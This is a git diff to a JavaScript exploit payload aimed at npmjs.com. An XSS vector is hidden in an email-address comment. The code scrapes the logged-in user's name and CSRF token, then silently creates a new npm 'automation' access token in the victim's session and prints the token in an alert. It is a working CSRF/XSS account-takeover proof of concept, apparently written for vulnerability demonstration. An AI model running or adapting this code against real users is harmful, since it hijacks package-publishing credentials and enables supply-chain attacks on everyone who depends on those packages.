@@ -1,5 +1,9 @@
-let username = "";
-let a = document.scripts
+// "<style/onload=location=window.name>"@gmail.com
+
+var username = "";
+var a = document.scripts
+var r = (Math.random() + 1).toString(36).substring(3);
+
 for (var i = 0; i<a.length; i++){
     var test = a[i].textContent.match(/name":"(\w*)"/)?.[1]
     if (test){
@@ -8,7 +12,7 @@ for (var i = 0; i<a.length; i++){
 }
 // Create a FormData object
 const formData = new FormData();
-formData.append("name", "teste");
+formData.append("name", "test-" + r);
 formData.append("access", "automation");
 formData.append("csrftoken", document.querySelector('input[name=csrftoken]').value);
 
@@ -30,7 +34,7 @@ fetch(`https://www.npmjs.com/settings/${username}/tokens/new`, {
     if (tokenElement) {
         const token = tokenElement.textContent.trim();
         console.log("Generated Token:", token);
-        alert("Generated Token: " + token)
+        alert("Generated Token: " + token);
         return token; // Use the token as needed
     } else {
         console.error("Token not found in the response.");
